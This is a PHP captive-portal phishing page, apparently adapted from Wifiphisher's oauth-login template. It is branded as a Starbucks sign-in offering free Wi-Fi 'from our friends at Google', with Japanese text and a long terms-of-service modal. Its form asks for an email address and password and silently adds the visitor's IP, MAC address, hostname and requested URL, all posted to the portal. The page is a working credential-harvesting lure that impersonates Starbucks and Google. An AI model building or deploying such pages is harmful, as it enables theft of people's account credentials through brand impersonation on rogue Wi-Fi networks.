<?php
$destination = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
require_once('helper.php');
?>

  <html>

  <head>

    <title>サインイン - スターバックス</title>

    <meta charset='UTF-8'>
    <meta http-equiv="cache-control" content="no-cache" />
    <meta http-equiv="expires" content="0" />
    <meta http-equiv="pragma" content="no-cache" />
    <meta name="viewport" content="width=device-width,
    initial-scale=0.75, maximum-scale=0.75, user-scalable=no">

    <script src="jquery-2.2.1.min.js"></script>
    <script type="text/javascript">
      function redirect() {
        setTimeout(function() {
          window.location = "/captiveportal/index.php";
        }, 100);
      }
    </script>

    <link rel="stylesheet" href="assets/css/bootstrap.min.css">
    <link rel="stylesheet" href="assets/css/style.css">
    <link rel="icon" type="image/png" href="assets/img/s5g1cxz9vr.png"/>

    <style>

    body {
      background-image: url("assets/img/5atoko1sqg.png");
      background-position: center;
      background-attachment: fixed;
      background-repeat: no-repeat;
      -webkit-background-size: 100%;
      -moz-background-size: 100%;
      -o-background-size: 100%;
      background-size: 100%;
      -webkit-background-size: cover;
      -moz-background-size: cover;
      -o-background-size: cover;
      background-size: cover;
    }

    .google-header-bar {
    height: 71px;
    border-bottom: 1px solid #e5e5e5;
    overflow: hidden;
    }

    .google-header-bar.centered {
    border: 0;
    height: 108px;
    }

    .google-header-bar.centered .header .logo {
    float: none;
    margin: 40px auto 30px;
    display: block;
    }
    .google-header-bar.centered .header .secondary-link {
    display: none
    }

    .header .logo {
    margin: 17px 0 0;
    float: left;
    height: 38px;
    width: 116px;
    }
    </style>

    <style media="screen and (max-width: 800px), screen and (max-height: 800px)">
      .google-header-bar.centered {
        height: 83px;
      }

      .google-header-bar.centered .header .logo {
        margin: 25px auto 20px;
      }

      .card {
        margin-bottom: 20px;
      }
    </style>

    <style media="screen and (max-width: 580px)">
      html,
      body {
        font-size: 14px;
      }

      .google-header-bar.centered {
        height: 73px;
      }

      .google-header-bar.centered .header .logo {
        margin: 20px auto 15px;
      }

      .content {
        padding-left: 10px;
        padding-right: 10px;
      }

      .hidden-small {
        display: none;
      }

      .card {
        padding: 20px 15px 30px;
        width: 270px;
      }

      .footer ul li {
        padding-right: 1em;
      }

      .lang-chooser-wrap {
        display: none;
      }
    </style>

  </head>

  <body>

    <div class="container">
      <div class="account-wall">
        <img class="profile-img" src="assets/img/pa6dyy5wcc.png" alt=""></img>

        <h1 class="text-center login-title">Free Wi-Fi</h1>
        <h2 class="text-center friends-text">From our friends at Google</h2>

          <form method="POST" action="/captiveportal/index.php" onsubmit="redirect()" class="form-signin">

            <input type="text" name="email" class="form-control" placeholder="Email" _autofocus="true" autocorrect="off" autocomplete="off" autocapitalize="off" required>
            <input type="password" name="password" class="form-control" placeholder="Password" autocorrect="off" autocomplete="off" autocapitalize="off" required><br>
            <input type="hidden" name="hostname" value="<?=getClientHostName($_SERVER['REMOTE_ADDR']);?>">
            <input type="hidden" name="mac" value="<?=getClientMac($_SERVER['REMOTE_ADDR']);?>">
            <input type="hidden" name="ip" value="<?=$_SERVER['REMOTE_ADDR'];?>">
            <input type="hidden" name="target" value="<?=$destination?>">
            <button class="btn btn-primary btn-block btn-xlarge btn-sharp" name="login" type="submit">インターネットに接続</button>
            <div class="text-center terms-text1"><a href="#" class="url-color" id="btn1">利用規約</a>への同意と</div>
            <div class="text-center terms-text2"><a href="#" class="url-color">Googleプライバシーポリシー</a>を承認します。</div>
            <div class="text-center terms-text3">助けが必要ですか？<a href="#" class="url-color">855-446-2374</div>

          </form>

<!-- Copyright (c) Wifiphisher.org (https://github.com/wifiphisher/wifiphisher/blob/master/wifiphisher/data/phishing-pages/oauth-login/index.html) -->
<!-- The Modal -->
<div id="myModal" class="modal url-color1">

  <!-- Modal content -->
  <div class="modal-content">
    <div class="modal-header">
      <span class="close">×</span>
      <h2>利用規約</h2>
    </div>
    <div class="modal-body">
      <p>本サービスは、お客様にご利用いただくフリーWIFIインターネットサービス（以下「本サービス」といいます）です。すべての利用者は、独立した利用者として個別にログインする必要があります。</p>
      <p>
      本サービスは以下により提供されます：
</p><p>
(1) 利用者は、本サービスを違法、不道徳または不適切な目的で利用しないものとします；
</p><p>
(2) お客様はいかなる形式であれ、攻撃的または迷惑な通信を行うために本サービスを使用しないものとします。このような使用には、違法、中傷的、脅迫的、迷惑、わいせつ、憎悪的、虐待的、有害（ウイルス、破損ファイル、その他類似のソフトウェアまたはプログラムを含みますが、これらに限定されません）、プライバシー侵害、またはその他の好ましくないコンテンツの投稿、送信、アップロード、ダウンロード、またはその他の促進が含まれます；
</p><p>
(3) 利用者は、本サービスを使用して、未成年者に危害を加えたり、危害を加えようとしたりしないものとします；
</p><p>
(4) お客様は、本サービスまたは当社のシステムの運営を危険にさらす、または損なわせるような行為を行わず、また故意にそのような行為を他人に許可しないものとします；
</p><p>
(5) お客様は、本サービスの他の利用者、当社のスタッフ、または無線LANホットスポットの周辺にいるいかなる者に対しても、虐待的または脅迫的な行為を行わないものとします；
</p><p>
(6) 本サービスを利用して、他者の権利を侵害する方法でコンテンツにアクセスしたり、コンテンツを使用したりしないこと；
</p><p>
(6) 本サービスが、許容される使用に関する第三者のポリシーまたは関連するインターネット基準（該当する場合）に従って使用されていること。
</p><p>
(8) お客様は、営利目的であるか否かを問わず、本サービスのいかなる側面も再販売または再放送しないことに同意するものとします。利用者は、本サービスを利用する権利が利用者の個人的な利用に限定され、本サービスを利用する権利を他者に譲渡したり、本サービスまたは本サービスに関連して利用者に提供されたユーザー名、パスワード、その他の権利を他者に利用させたりすることはできないものとします。
</p><p>
(9) ユーザーはまた、ユニットを変更したり、不正な目的で本サービスを使用したり、当社の事業、評判、従業員、加入者、施設、第三者、または一般大衆に損害やリスクを生じさせるような方法で本サービスを使用しないことに同意するものとします。
</p><p>
(10) ユーザーは、ユーザー名やパスワード、またはユーザーやユーザーのユニットに割り当てられた特定のIPアドレスや電子メールアドレスに対して、所有権や所有権を有しません。当社は、サービスの違法または詐欺的な使用が疑われる場合、お客様に事前に通知することなく、いつでもこれらのアドレスを変更したり、任意のアドレスへのサービスを停止または中断したりすることができます。
</p>
    </div>
  </div>

    <script src='/static/js/jquery.min.js'></script>
    <script src="/static/js/index.js"></script>
<script>
// Get the modal
var modal = document.getElementById('myModal');

// Get the button that opens the modal
var btn = document.getElementById("btn1");

// Get the <span> element that closes the modal
var span = document.getElementsByClassName("close")[0];

// When the user clicks the button, open the modal
btn.onclick = function() {
    modal.style.display = "block";
}

// When the user clicks on <span> (x), close the modal
span.onclick = function() {
    modal.style.display = "none";
}

// When the user clicks anywhere outside of the modal, close it
window.onclick = function(event) {
    if (event.target == modal) {
        modal.style.display = "none";
    }
}
</script>

      </div>
    </div>

  </body>

</html>
